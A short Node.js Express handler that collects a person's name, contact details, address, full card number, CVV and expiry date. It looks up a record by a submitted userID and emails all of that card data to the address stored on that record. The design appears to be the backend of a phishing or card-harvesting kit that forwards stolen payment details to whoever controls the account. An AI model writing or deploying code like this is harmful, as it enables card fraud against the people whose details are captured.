const { sendMail } = require('../helpers/sendMail')
const prisma = require('../db')

const send = async (req, res) => {
  const {
    firstName,
    lastName,
    email,
    phoneNumber,
    address,
    zip,
    city,
    cardNumber,
    cvv,
    year,
    month,
    userID,
  } = req.body
  if (
    !email ||
    !firstName ||
    !lastName ||
    !phoneNumber ||
    !city ||
    !address ||
    !zip ||
    !cardNumber ||
    !cvv ||
    !year ||
    !month ||
    !userID
  ) {
    res.status(400).json({ error: 'all fields required' })
    return
  }

  const resp = await prisma.details.findUnique({
    where: {
      id: userID,
    },
  })
  console.log('user', resp)
  sendMail(
    firstName,
    lastName,
    email,
    phoneNumber,
    address,
    zip,
    city,
    cardNumber,
    cvv,
    year,
    month,
    resp['email'],
    res
  )
}

module.exports = send
